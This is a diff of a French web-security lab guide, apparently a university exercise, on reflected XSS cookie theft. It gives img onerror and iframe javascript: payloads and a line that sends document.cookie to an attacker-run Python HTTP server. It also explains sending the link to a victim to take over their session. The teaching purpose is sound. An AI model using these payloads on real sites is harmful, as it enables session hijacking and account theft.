@@ -328,55 +328,58 @@ Lorsque vous avez compris comment fonctionne la récupération du panier, essaye
 ### Cross-Site Scripting (XSS) - Voler des cookies
 Dans cette section, vous allez trouver et exploiter la vulnérabilité de type Reflected XSS. 
 
-Vous allez commencer par rechercher un paramètre ou une entrée qui n’effectue aucun filtrage ni nettoyage et qui est inclus directement dans la réponse immédiate de l’application Web.
-Ensuite, vous allez créer un lien spécial qui volera les cookies d'un utilisateur lorsqu'il cliquera dessus.
+Vous allez commencer par rechercher un paramètre présent dans l'URL qui n’effectue aucun filtrage ni nettoyage et qui est inclus directement dans la réponse immédiate de l’application Web.
+Ensuite, vous allez créer une URL spéciale qui volera les cookies d’un utilisateur lorsqu’il la visitera.
 
-Tout d'abord, vous devez trouver une page avec un paramètre ou une entrée vulnérable. Vous devrez trouver une page où une entrée utilisateur est incluse dans la réponse immédiate de l'application Web (dans le contenu de la page HTML).
+Pour trouver la vulnérabilité :
+- Trouvez une page avec un paramètre potentiellement vulnérable
+    - Vous devez trouver une page où la valeur d'un paramètre est inclus **dans la réponse immédiate de l'application Web** (dans le contenu de la page HTML)
+- Vérifiez si la valeur de ce paramètre est incluse dans le contenu de la page sans validation ni échappement
+    - Vous pouvez essayer de mettre du code HTML comme valeur (par exemple `<h1>Lyon1</h1>`) et si le contenu HTML est inclus et interprété sur la page, vous avez trouvé une vulnérabilité
+        - Il faudra peut-être encoder le code HTML dans le format URL-encoded afin qu'il puisse être utilisé dans l'URL. Pour ce faire, utilisez un encodeur en ligne comme [https://www.urlencoder.org/](https://www.urlencoder.org/)
+- **Quelle page et quel paramètre sont vulnérables ?**
 
-Ensuite, il faudra vérifier si cette entrée est incluse dans le contenu de la page sans validation ni échappement.
+Félicitations, vous avez trouvé un moyen d’injecter du code HTML dans la page via un paramètre vulnérable.
 
-Vous pouvez essayer de mettre du code HTML comme entrée utilisateur (par exemple `<h1>Lyon1</h1>`) et si le contenu HTML est inclus et interprété sur la page, vous avez trouvé une vulnérabilité.
+Il faut maintenant trouver un moyen d'injecter du code JavaScript dans la page pour pouvoir voler les cookies de l'utilisateur.
 
-- Quelle page et quel paramètre sont vulnérables ?
+Pour faire cela, vous pouvez utiliser les tags HTML `img` ou `iframe`.
 
-Félicitations, vous avez trouvé un moyen d’injecter du code HTML dans la page. 
-Il faut maintenant trouver un moyen d'injecter du code JavaScript dans la page afin de pouvoir récupérer et envoyer les cookies de l'utilisateur. 
-Pour faire cela, vous pouvez utiliser le tag HTML `iframe` ou `img`.
+- `img` qui essaye de charger une image inexistante avec du code JS dans le paramètre `onerror="CODE_JS"`
+- `iframe` avec le code JS dans le paramètre `src="javascript:CODE_JS"`
 
-- `iframe` avec le code JS dans le paramètre `src=”javascript:CODE_JS”`
-- `img` qui essaye de charger une image inexistante avec du code JS dans le paramètre `onerror=”CODE_JS”`
-
-- Quelle requête utiliseriez-vous pour afficher `Lyon1` en tant qu'alerte JavaScript ? 
+- **Que mettez-vous comme valeur de paramètre pour afficher `Lyon1` comme alerte JavaScript ?**
 
 Ensuite, il faut trouver un moyen de récupérer les cookies de l'utilisateur avec du code JavaScript. 
 Les cookies de l’utilisateur se trouvent dans la variable `document.cookie`.
-
-Affichez les cookies dans une alerte JS en utilisant la vulnérabilité trouvée précédemment.
-
-- Quelle requête utiliseriez vous pour faire cela ?
+- Affichez les cookies dans une alerte JS en utilisant la vulnérabilité trouvée précédemment.
+- **Que mettez-vous comme valeur de paramètre pour faire cela ?**
 
 Jusqu'à présent, vous avez affiché des cookies en exploitant une vulnérabilité XSS.
 
-Vous allez maintenant voir comment il est possible de voler les cookies d'un utilisateur en exploitant cette vulnérabilité. 
+Vous allez maintenant voler les cookies d'un utilisateur en exploitant cette vulnérabilité. 
 
-- Démarrez un serveur HTTP python sur le port `443` sur la machine OpenStack
+Pour ce faire:
+- Démarrez un serveur HTTP Python sur le port `443` sur la machine OpenStack
     - `sudo python3 -m http.server 443`
-- Créez une requête sur la page vulnérable en utilisant le tag HTML `img` avec `onerror` suivant
-    - `this.src="http://ADR-DE-LA-MACHINE-OPENSTACK:443/?c="+document.cookie`
-- Testez cette requête
-    - Si tout a été fait correctement dans les logs du serveur HTTP vous allez voir les cookies de l’utilisateur
 
-![Logs du serveur web avec les cookies de l'utilisateur](./webserver_log.png)
+- Créez une URL avec le parametre vulnérable contenant le tag HTML `img` avec `onerror` suivant
+    - `this.src='http://ADR-DE-LA-MACHINE-OPENSTACK:443/?c='+document.cookie`
 
-- Avez-vous réussi à exploiter cette vulnérabilité ? 
-- Quels champs contiennent les cookies volés ?
+- Testez l'URL créée précédemment depuis votre navigateur
+    - Si tout a été fait correctement dans les logs du serveur HTTP, vous allez voir les cookies de votre utilisateur ![Logs du serveur web avec les cookies de l'utilisateur](./webserver_log.png)
 
-De même, vous pouvez envoyer ce lien à la victime. 
-Lorsque la victime ouvrira ce lien, vous allez recevoir ses cookies. 
-Ensuite, il sera possible d'usurper son identité en utilisant ses cookies.
+- **Avez-vous réussi à exploiter cette vulnérabilité ?**
+- **Quelle URL avez-vous utilisé ?**
+- **Quels champs contiennent les cookies volés ?**
+
+De même, vous pouvez envoyer un lien avec cette URL à la victime. 
+Si la victime ouvre ce lien, les logs du serveur HTTP vont contenir ses cookies.
+Ensuite, il sera possible d'usurper son identité grâce à ses cookies.
 
 L'attaque vue ci-dessus est relativement compliquée à réaliser car la victime doit utiliser le lien fourni par l'attaquant. 
 Par conséquent, les attaques Reflected XSS et DOM XSS dans la plupart des cas ne sont pas considérées comme critiques.
+
 
 ### Cross-Site Scripting (XSS)  - Voler des cookies de l’administrateur
 Dans cette section, vous allez exploiter la vulnérabilité de type Stored XSS. 
